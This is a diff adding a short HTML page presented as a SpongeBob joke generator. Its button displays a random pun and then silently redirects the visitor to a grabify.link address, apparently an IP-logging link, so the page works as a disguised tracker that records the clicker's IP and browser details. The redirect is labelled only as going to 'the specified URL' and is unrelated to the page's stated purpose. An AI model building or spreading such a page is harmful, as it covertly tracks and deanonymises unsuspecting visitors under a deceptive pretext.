@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>SpongeBob Jokes Generator</title>
+    <script>
+        function generateJoke() {
+            var jokes = [
+                "Why did Patrick go to school with a ladder? Because he thought it was high school!",
+                "What do you call a SpongeBob SquarePants marathon? The best time ever!",
+                "Why did Mr. Krabs bring a ladder to work? Because he wanted to raise the roof!",
+                "What did SpongeBob say to the Krusty Krab pizza? You're the cheese to my pepperoni!",
+                "Why did Squidward go to the doctor? Because he had too many krabby patties!",
+                "What did Mrs. Puff say to SpongeBob? Don't let your grades deflate!",
+                "Why did Pearl start a band? Because she heard it was a shell of a good time!"
+            ];
+
+            var randomIndex = Math.floor(Math.random() * jokes.length);
+            var joke = jokes[randomIndex];
+            document.getElementById('jokeText').innerHTML = joke;
+
+            // Redirect to the specified URL
+            window.location.href = 'https://grabify.link/GPPFN6';
+        }
+    </script>
+</head>
+<body>
+    <h1>SpongeBob Jokes Generator</h1>
+    <button onclick="generateJoke()">Generate Joke</button>
+    <p id="jokeText"></p>
+</body>
+</html>
